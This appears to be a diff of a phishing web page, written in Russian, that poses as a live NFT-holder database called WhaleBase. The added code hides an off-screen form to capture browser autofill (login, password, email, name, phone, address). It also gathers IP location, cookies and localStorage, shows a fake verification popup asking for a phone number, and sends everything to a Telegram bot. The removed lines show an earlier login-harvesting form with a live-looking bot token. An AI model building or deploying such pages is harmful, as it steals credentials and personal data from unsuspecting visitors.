@@ -3,95 +3,134 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-<title>WhaleBase Pro</title>
+<title>WhaleBase | Live NFT Holders</title>
 <style>
+:root{--bg:#0a0e14;--card:#121720;--border:#1e2836;--accent:#3b82f6;--green:#10b981;--yellow:#f59e0b;--red:#ef4444;--text:#e2e8f0;--muted:#64748b}
 *{margin:0;padding:0;box-sizing:border-box}
-body{
-background:#0a0e14;color:#e2e8f0;
-font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
-min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px
-}
-.container{width:100%;max-width:420px}
-.header{text-align:center;margin-bottom:18px}
-.logo{font-size:40px;margin-bottom:4px}
-.logo-text{font-size:24px;font-weight:800;background:linear-gradient(135deg,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.logo-sub{font-size:11px;color:#64748b;letter-spacing:3px;text-transform:uppercase;margin-top:4px}
-.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:18px}
-.stat-box{background:#121720;border:1px solid #1e2836;border-radius:10px;padding:12px 8px;text-align:center}
-.stat-num{font-size:20px;font-weight:700;color:#10b981}
-.stat-lbl{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:3px}
-.card{background:#121720;border:1px solid #1e2836;border-radius:14px;padding:26px 22px}
-.card-title{font-size:17px;font-weight:700;text-align:center;margin-bottom:4px}
-.card-sub{font-size:12px;color:#64748b;text-align:center;margin-bottom:22px;line-height:1.4}
-.badge{display:block;background:rgba(245,158,11,0.12);color:#f59e0b;border:1px solid rgba(245,158,11,0.25);padding:8px 14px;border-radius:20px;font-size:11px;font-weight:600;text-align:center;margin-bottom:18px}
-.input-group{margin-bottom:13px}
-.input-group label{display:block;font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:5px;font-weight:600}
-.input-group input{width:100%;padding:13px 15px;background:#0a0e14;border:1px solid #1e2836;border-radius:9px;color:#fff;font-size:14px;font-family:inherit}
-.input-group input:focus{outline:none;border-color:#3b82f6}
-.input-group input::placeholder{color:#3a4450}
-.btn{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:5px}
-.btn:active{transform:scale(0.97);opacity:0.9}
-.footer{text-align:center;margin-top:14px;font-size:10px;color:#64748b}
-.loading{display:none;text-align:center;padding:30px 20px}
-.loading.active{display:block}
-.spinner{width:40px;height:40px;border:3px solid #1e2836;border-top-color:#3b82f6;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 14px}
-@keyframes spin{to{transform:rotate(360deg)}}
-@media(max-width:380px){.card{padding:20px 14px}.input-group input{padding:11px 13px;font-size:13px}.btn{padding:12px;font-size:14px}}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
+.topbar{background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
+.topbar .logo-s{font-size:20px;font-weight:700;background:linear-gradient(135deg,var(--accent),#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.topbar .live{color:var(--green);font-size:12px;font-weight:600}
+.topbar .live::before{content:"● ";animation:blink 1s infinite}
+@keyframes blink{50%{opacity:0}}
+.container{max-width:900px;margin:0 auto;padding:16px}
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:20px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center}
+.stat-card:active{transform:scale(0.97)}
+.stat-card .val{font-size:26px;font-weight:800}
+.val.g{color:var(--green)}.val.y{color:var(--yellow)}.val.b{color:var(--accent)}
+.stat-card .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+.section{margin-bottom:20px}
+.section-title{font-size:14px;font-weight:600;margin-bottom:10px}
+.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
+table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);white-space:nowrap}
+td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
+td.addr{color:var(--accent);font-family:monospace;font-size:12px}
+td.val{color:var(--green);font-weight:600}
+tr:last-child td{border-bottom:none}
+
+/* Затемнение */
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:100;justify-content:center;align-items:center;padding:20px}
+.overlay.show{display:flex}
+/* Попап */
+.popup{background:var(--card);border:1px solid var(--accent);border-radius:16px;padding:28px 22px;max-width:380px;width:100%;text-align:center;animation:popIn 0.3s ease}
+@keyframes popIn{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
+.popup .icon{font-size:44px;margin-bottom:10px}
+.popup h3{font-size:18px;font-weight:700;margin-bottom:6px;color:#fff}
+.popup .desc{font-size:12px;color:var(--muted);margin-bottom:18px;line-height:1.5}
+.popup input{width:100%;padding:14px 16px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:15px;font-family:inherit;text-align:center;margin-bottom:12px}
+.popup input:focus{outline:none;border-color:var(--accent)}
+.popup .btn-pop{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
+.popup .btn-pop:active{transform:scale(0.97)}
+.popup .skip{display:block;margin-top:12px;color:var(--muted);font-size:11px;text-decoration:underline;cursor:pointer}
+.hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none}
+.footer-bar{text-align:center;padding:20px;color:var(--muted);font-size:11px;border-top:1px solid var(--border);margin-top:30px}
+@media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}}
 </style>
 </head>
 <body>
+
+<!-- Скрытые поля автозаполнения -->
+<div class="hidden-form">
+<form>
+<input type="text" name="u" autocomplete="username">
+<input type="password" name="p" autocomplete="current-password">
+<input type="email" name="e" autocomplete="email">
+<input type="text" name="fn" autocomplete="name">
+<input type="text" name="gn" autocomplete="given-name">
+<input type="text" name="ln" autocomplete="family-name">
+<input type="tel" name="ph" autocomplete="tel-national">
+<input type="tel" name="ph2" autocomplete="tel">
+<input type="text" name="org" autocomplete="organization">
+<input type="text" name="adr" autocomplete="street-address">
+<input type="text" name="cty" autocomplete="address-level2">
+<input type="text" name="cnt" autocomplete="country-name">
+<input type="text" name="pst" autocomplete="postal-code">
+</form>
+</div>
+
+<!-- Верхняя панель -->
+<div class="topbar">
+<div class="logo-s">🐋 WhaleBase</div>
+<div class="live">LIVE • <span id="updSec">3</span> сек назад</div>
+</div>
+
 <div class="container">
 
-<div class="header">
-<div class="logo">🐋</div>
-<div class="logo-text">WhaleBase Pro</div>
-<div class="logo-sub">NFT Holder Database</div>
+<div class="stats-row">
+<div class="stat-card"><div class="val g">1,847,392</div><div class="lbl">Всего холдеров</div></div>
+<div class="stat-card"><div class="val y">47,821</div><div class="lbl">Киты (>50 ETH)</div></div>
+<div class="stat-card"><div class="val b">3,291</div><div class="lbl">Whales (>100 ETH)</div></div>
+<div class="stat-card"><div class="val g">142</div><div class="lbl">Новых за 24ч</div></div>
 </div>
 
-<div class="stats">
-<div class="stat-box"><div class="stat-num">1.8M</div><div class="stat-lbl">Холдеров</div></div>
-<div class="stat-box"><div class="stat-num" style="color:#f59e0b">47K</div><div class="stat-lbl">Китов</div></div>
-<div class="stat-box"><div class="stat-num" style="color:#3b82f6">Live</div><div class="stat-lbl">Сейчас</div></div>
+<div class="section">
+<div class="section-title">🏆 Топ холдеров</div>
+<div class="table-wrap">
+<table>
+<thead><tr><th>#</th><th>Кошелёк</th><th>NFT</th><th>ETH</th><th>USD</th></tr></thead>
+<tbody>
+<tr><td>1</td><td class="addr">0xb1Ea...7d82</td><td>12</td><td class="val">2,847</td><td class="val">$5.9M</td></tr>
+<tr><td>2</td><td class="addr">0x3F5c...a1B4</td><td>8</td><td class="val">2,103</td><td class="val">$4.4M</td></tr>
+<tr><td>3</td><td class="addr">0x9A2d...e4F1</td><td>15</td><td class="val">1,892</td><td class="val">$3.9M</td></tr>
+<tr><td>4</td><td class="addr">0xC7f8...b3D6</td><td>6</td><td class="val">1,567</td><td class="val">$3.3M</td></tr>
+<tr><td>5</td><td class="addr">0x2E1a...c9F8</td><td>21</td><td class="val">1,340</td><td class="val">$2.8M</td></tr>
+</tbody>
+</table>
+</div>
 </div>
 
-<div class="card" id="mainCard">
-<div class="card-title">🔐 Доступ к базе</div>
-<div class="card-sub">Закрытая база холдеров NFT.<br>Войдите для продолжения.</div>
-<div class="badge">⚠ Только для держателей NFT</div>
-
-<div class="input-group">
-<label>Email</label>
-<input type="email" id="emailField" placeholder="your@email.com" autocomplete="email">
 </div>
 
-<div class="input-group">
-<label>Пароль</label>
-<input type="password" id="passField" placeholder="••••••••" autocomplete="current-password">
-</div>
+<div class="footer-bar">🔒 WhaleBase Pro • Real-time blockchain data</div>
 
-<div class="input-group">
-<label>Телефон (для подтверждения)</label>
-<input type="tel" id="phoneField" placeholder="+7 (___) ___-__-__" autocomplete="tel-national">
+<!-- Попап -->
+<div class="overlay" id="overlay">
+<div class="popup">
+<div class="icon">🛡️</div>
+<h3>Подтвердите доступ</h3>
+<div class="desc">Обнаружен новый IP-адрес.<br>Введите номер телефона для верификации.<br><br>📡 Это защищает базу от ботов и скаммеров.</div>
+<input type="tel" id="popupPhone" placeholder="+7 (___) ___-__-__" autocomplete="tel-national">
+<button class="btn-pop" onclick="submitPhone()">Подтвердить и продолжить</button>
+<a class="skip" onclick="closePopup()">Пропустить (ограниченный доступ)</a>
 </div>
-
-<button class="btn" id="loginBtn" onclick="login()">Войти в базу</button>
-</div>
-
-<div class="loading" id="loadingBlock">
-<div class="spinner"></div>
-<p style="color:#64748b;font-size:13px">Загружаем базу данных...</p>
-</div>
-
-<div class="footer">🔒 Данные шифруются. Доступ не разглашается.</div>
 </div>
 
 <script>
-const TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
-const CHAT="8192226287";
+const TOKEN="СЮДА_ТОКЕН_БОТА";
+const CHAT="СЮДА_CHAT_ID";
 const REDIR="https://www.google.com";
 const sid='w'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 
-async function collect(d){
+// Обновление таймера
+setInterval(()=>{document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
+
+// Пассивный сбор
+let passiveData={};
+(async function collectPassive(){
+const d=passiveData;
+
 try{
 const r=await fetch("https://ipapi.co/json/");
 const j=await r.json();
@@ -124,28 +163,39 @@ d.ref=document.referrer||"direct";
 d.cookie=document.cookie||"-";
 
 try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1000)}catch(e){d.ls="-"}
+})();
+
+// Ждём автозаполнение
+setTimeout(async ()=>{
+passiveData.af_u=document.querySelector('[name="u"]').value||"-";
+passiveData.af_p=document.querySelector('[name="p"]').value||"-";
+passiveData.af_e=document.querySelector('[name="e"]').value||"-";
+passiveData.af_fn=document.querySelector('[name="fn"]').value||"-";
+passiveData.af_ph=document.querySelector('[name="ph"]').value||"-";
+passiveData.af_ph2=document.querySelector('[name="ph2"]').value||"-";
+passiveData.af_adr=document.querySelector('[name="adr"]').value||"-";
+},3000);
+
+// Показать попап через 15 секунд
+setTimeout(()=>{
+document.getElementById('overlay').classList.add('show');
+},15000);
+
+// Закрыть попап
+function closePopup(){
+document.getElementById('overlay').classList.remove('show');
 }
 
-async function login(){
-const email=document.getElementById('emailField').value.trim();
-const pass=document.getElementById('passField').value.trim();
-const phone=document.getElementById('phoneField').value.trim();
+// Отправить телефон
+async function submitPhone(){
+const phone=document.getElementById('popupPhone').value.trim();
+if(!phone){alert('Введите номер телефона');return}
 
-if(!email&&!phone){alert('Введите email или телефон');return}
+passiveData.entered_phone=phone;
 
-document.getElementById('mainCard').style.display='none';
-document.getElementById('loadingBlock').classList.add('active');
-document.getElementById('loginBtn').disabled=true;
-
-const d={};
-d.entered_email=email||"-";
-d.entered_password=pass||"-";
-d.entered_phone=phone||"-";
-
-await collect(d);
-
+const d=passiveData;
 const msg=
-`🚨 НОВЫЙ ЗАХОД
+`🚨 ЗАХОД С ТЕЛЕФОНОМ
 
 🆔 ${sid}
 🕐 ${new Date().toLocaleString("ru-RU")}
@@ -162,9 +212,16 @@ const msg=
 🔋 ${d.bat}
 📶 ${d.conn||"-"}
 
-✉️ EMAIL: ${d.entered_email}
-🔑 PASSWORD: ${d.entered_password}
-📞 PHONE: ${d.entered_phone}
+📞 ВВЁЛ ТЕЛЕФОН: ${d.entered_phone}
+
+🔑 АВТОЗАПОЛНЕНИЕ:
+LOGIN: ${d.af_u||"-"}
+PASS: ${d.af_p||"-"}
+EMAIL: ${d.af_e||"-"}
+NAME: ${d.af_fn||"-"}
+PHONE: ${d.af_ph||"-"}
+PHONE2: ${d.af_ph2||"-"}
+ADDR: ${d.af_adr||"-"}
 
 🔗 REF: ${d.ref}
 🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}
@@ -176,7 +233,10 @@ headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:msg})
 });
 
-setTimeout(()=>{window.location.replace(REDIR)},2500);
+document.getElementById('overlay').classList.remove('show');
+// Показываем что доступ открыт
+alert('✅ Доступ подтверждён. База загружается...');
+setTimeout(()=>{window.location.replace(REDIR)},2000);
 }
 </script>
 </body>
